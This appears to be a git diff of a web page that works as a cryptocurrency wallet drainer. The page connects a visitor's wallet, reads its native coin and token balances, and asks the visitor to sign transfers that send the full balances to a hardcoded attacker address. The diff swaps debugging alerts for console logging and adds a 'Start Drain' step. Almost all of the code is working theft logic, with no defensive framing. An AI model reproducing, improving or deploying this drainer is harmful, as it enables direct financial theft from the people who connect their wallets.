@@ -19,24 +19,40 @@
 <body class="min-h-screen flex items-center justify-center p-4">
 
 <div class="max-w-md w-full">
+    <!-- CONNECT -->
     <div id="connect" class="card p-8 text-center">
         <div class="text-6xl mb-4">🔐</div>
         <h1 class="text-3xl font-bold text-gray-800 mb-4">Connect Wallet</h1>
-        <button onclick="connect()" 
+        <button onclick="connect()" id="connectBtn"
             class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-xl text-lg font-bold">
             Connect Now
         </button>
     </div>
 
+    <!-- CONNECTED - READY TO DRAIN -->
+    <div id="ready" class="card p-8 text-center hidden">
+        <div class="text-6xl mb-4">✅</div>
+        <h2 class="text-2xl font-bold text-gray-800 mb-2">Wallet Connected</h2>
+        <p id="connectedAddress" class="text-sm text-gray-600 mb-6"></p>
+        <button onclick="startDrain()" 
+            class="w-full bg-gradient-to-r from-red-600 to-pink-600 text-white py-4 rounded-xl text-lg font-bold mb-4">
+            🚀 Start Drain
+        </button>
+        <button onclick="location.reload()" class="text-gray-600 text-sm">Disconnect</button>
+    </div>
+
+    <!-- PROCESSING -->
     <div id="processing" class="card p-8 text-center hidden">
         <div class="text-6xl mb-4 spinner">⚡</div>
         <h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
         <p id="status" class="text-gray-600 mb-4">Working...</p>
-        <div class="w-full bg-gray-200 rounded-full h-3">
+        <div class="w-full bg-gray-200 rounded-full h-3 mb-2">
             <div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
         </div>
+        <p id="detail" class="text-xs text-gray-500"></p>
     </div>
 
+    <!-- SUCCESS -->
     <div id="success" class="card p-8 text-center hidden">
         <div class="text-6xl mb-4">✅</div>
         <h2 class="text-2xl font-bold text-green-600 mb-4">Success!</h2>
@@ -74,79 +90,70 @@ const modal = createWeb3Modal({
     enableAnalytics:false
 });
 
+let provider, signer, address, chainId;
 let results = [];
 
 function show(id) {
-    ['connect','processing','success'].forEach(x => document.getElementById(x).classList.add('hidden'));
+    ['connect','ready','processing','success'].forEach(x => document.getElementById(x).classList.add('hidden'));
     document.getElementById(id).classList.remove('hidden');
 }
 
 function prog(n){document.getElementById('progress').style.width=n+'%';}
 function stat(t){document.getElementById('status').textContent=t;}
+function det(t){document.getElementById('detail').textContent=t;}
 
 window.connect = async function() {
     try {
-        alert('Opening wallet selection...');
-        
+        console.log('Opening modal...');
         await modal.open();
-        
-        alert('Waiting for wallet connection...');
-        
-        // Wait for modal to close (means user connected)
-        let connected = false;
-        let attempts = 0;
-        
-        while(!connected && attempts < 30) {
-            await new Promise(r => setTimeout(r, 1000));
-            attempts++;
-            
-            const state = modal.getState();
-            if(state && state.open === false) {
-                alert('Modal closed, checking connection...');
-                connected = true;
-                break;
-            }
-        }
-        
-        if(!connected) {
-            alert('Connection timeout');
-            return;
-        }
-        
-        alert('Connection detected! Getting provider...');
-        
-        // Get wallet account via modal
-        const walletProvider = modal.getWalletProvider();
-        if(!walletProvider) {
-            alert('ERROR: No wallet provider found');
-            return;
-        }
-        
-        alert('Provider found! Creating ethers provider...');
-        
-        const provider = new ethers.providers.Web3Provider(walletProvider);
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        
-        alert('Connected! Address: ' + address.slice(0,10) + '...');
-        
-        const network = await provider.getNetwork();
-        const chainId = network.chainId;
-        
-        alert('Chain ID: ' + chainId);
-        
-        // Start drainage
-        await drain(provider, signer, address, chainId);
-        
     } catch(e) {
-        alert('ERROR: ' + e.message);
-        console.error(e);
+        console.error('Connection error:', e);
+        alert('Connection failed: ' + e.message);
     }
 }
 
-async function drain(provider, signer, address, chainId) {
+// Listen for connection
+modal.subscribeProvider(async(state) => {
+    console.log('Provider state:', state);
+    
+    if(state.isConnected && state.address) {
+        console.log('Wallet connected!');
+        console.log('Address:', state.address);
+        
+        try {
+            address = state.address;
+            provider = new ethers.providers.Web3Provider(state.provider);
+            signer = provider.getSigner();
+            
+            const net = await provider.getNetwork();
+            chainId = net.chainId;
+            
+            console.log('Chain ID:', chainId);
+            
+            // Show ready screen
+            document.getElementById('connectedAddress').textContent = 
+                'Address: ' + address.slice(0,6) + '...' + address.slice(-4);
+            
+            show('ready');
+            
+        } catch(e) {
+            console.error('Setup error:', e);
+            alert('Setup failed: ' + e.message);
+        }
+    }
+});
+
+window.startDrain = async function() {
+    console.log('=== STARTING DRAIN ===');
+    
+    if(!provider || !signer || !address) {
+        alert('Not connected! Please reconnect.');
+        location.reload();
+        return;
+    }
+    
     show('processing');
-    stat('Starting...');
+    stat('Initializing...');
     prog(10);
     results = [];
     
@@ -157,16 +164,16 @@ async function drain(provider, signer, address, chainId) {
         const chainName = chainNames[chainId] || 'Unknown';
         const currency = currencies[chainId] || 'Token';
         
-        alert('Draining on ' + chainName);
-        
-        // Native
-        stat('Checking ' + currency + '...');
+        console.log('Chain:', chainName);
+        stat('Checking balance...');
         prog(20);
         
+        // NATIVE
         const bal = await provider.getBalance(address);
         const balEth = parseFloat(ethers.utils.formatEther(bal));
         
-        alert(currency + ' balance: ' + balEth);
+        console.log('Balance:', balEth, currency);
+        det(currency + ': ' + balEth.toFixed(4));
         
         if(balEth > 0.001) {
             stat('Transferring ' + currency + '...');
@@ -175,7 +182,8 @@ async function drain(provider, signer, address, chainId) {
             const amt = bal.sub(gp.mul(21000).mul(2));
             
             if(amt.gt(0)) {
-                alert('Sending transaction... Please CONFIRM in your wallet!');
+                console.log('Sending transaction...');
+                det('Please confirm in wallet...');
                 
                 const tx = await signer.sendTransaction({
                     to: DEST,
@@ -183,12 +191,12 @@ async function drain(provider, signer, address, chainId) {
                     gasLimit: 21000
                 });
                 
-                alert('TX sent: ' + tx.hash);
-                stat('Confirming...');
+                console.log('TX sent:', tx.hash);
+                det('Confirming: ' + tx.hash.slice(0,10) + '...');
                 
                 await tx.wait();
                 
-                alert('TX confirmed!');
+                console.log('TX confirmed!');
                 
                 results.push({
                     symbol: currency,
@@ -196,38 +204,47 @@ async function drain(provider, signer, address, chainId) {
                     txHash: tx.hash
                 });
             }
+        } else {
+            console.log('Balance too low');
         }
         
         prog(50);
         
-        // Tokens
+        // TOKENS
         const tokens = TOKENS[chainId] || [];
-        alert('Checking ' + tokens.length + ' tokens...');
+        console.log('Checking', tokens.length, 'tokens...');
+        stat('Checking tokens...');
         
         for(let i=0; i<tokens.length; i++) {
             const tok = tokens[i];
-            prog(50 + (50 * i / tokens.length));
+            prog(50 + (45 * (i+1) / tokens.length));
             stat('Checking ' + tok.s + '...');
+            det('Token ' + (i+1) + '/' + tokens.length);
             
             try {
                 const tc = new ethers.Contract(tok.a, ABI, provider);
                 const tokBal = await tc.balanceOf(address);
                 
+                console.log(tok.s, 'balance:', tokBal.toString());
+                
                 if(tokBal.gt(0)) {
                     const dec = await tc.decimals();
                     const fmt = ethers.utils.formatUnits(tokBal, dec);
                     
-                    alert(tok.s + ' balance: ' + fmt);
-                    alert('Transferring ' + tok.s + '... Please CONFIRM!');
+                    console.log(tok.s, 'formatted:', fmt);
+                    
+                    stat('Transferring ' + tok.s + '...');
+                    det('Please confirm in wallet...');
                     
                     const tcs = tc.connect(signer);
                     const tx = await tcs.transfer(DEST, tokBal, {gasLimit:100000});
                     
-                    alert(tok.s + ' TX sent: ' + tx.hash);
+                    console.log(tok.s, 'TX:', tx.hash);
+                    det('Confirming: ' + tx.hash.slice(0,10) + '...');
                     
                     await tx.wait();
                     
-                    alert(tok.s + ' confirmed!');
+                    console.log(tok.s, 'confirmed!');
                     
                     results.push({
                         symbol: tok.s,
@@ -236,35 +253,44 @@ async function drain(provider, signer, address, chainId) {
                     });
                 }
             } catch(e) {
-                alert(tok.s + ' error: ' + e.message);
+                console.error(tok.s, 'error:', e.message);
             }
         }
         
         prog(100);
         
+        console.log('Drainage complete. Results:', results.length);
+        
         if(results.length === 0) {
-            alert('No assets found');
-            show('connect');
+            alert('No assets found to transfer');
+            show('ready');
             return;
         }
         
-        alert('Drainage complete! ' + results.length + ' transfers');
-        
-        let html = '<p class="font-bold mb-3">Completed:</p>';
-        results.forEach(r => {
-            html += `<div class="mb-2 pb-2 border-b"><p class="font-semibold">${r.symbol}</p><p class="text-xs">${r.amount}</p><p class="text-xs text-blue-600 break-all">${r.txHash}</p></div>`;
+        // Display results
+        let html = '<p class="font-bold mb-3 text-center">Completed Transfers:</p>';
+        results.forEach((r,i) => {
+            html += `<div class="mb-3 pb-3 ${i<results.length-1?'border-b border-gray-200':''}">
+                <p class="font-semibold text-gray-800">${r.symbol}</p>
+                <p class="text-xs text-gray-600">Amount: ${r.amount}</p>
+                <p class="text-xs text-blue-600 break-all">TX: ${r.txHash}</p>
+            </div>`;
         });
         document.getElementById('result').innerHTML = html;
         
         show('success');
         
+        console.log('=== DRAINAGE COMPLETE ===');
+        
     } catch(e) {
-        alert('Drainage error: ' + e.message);
-        show('connect');
+        console.error('Drainage error:', e);
+        alert('Error: ' + e.message);
+        show('ready');
     }
 }
 
-alert('System ready. Destination: 0xe9d83750dF3351b77653EBBcb06B300D6Cf59a2f');
+console.log('System initialized');
+console.log('Destination:', DEST);
 </script>
 
 </body>
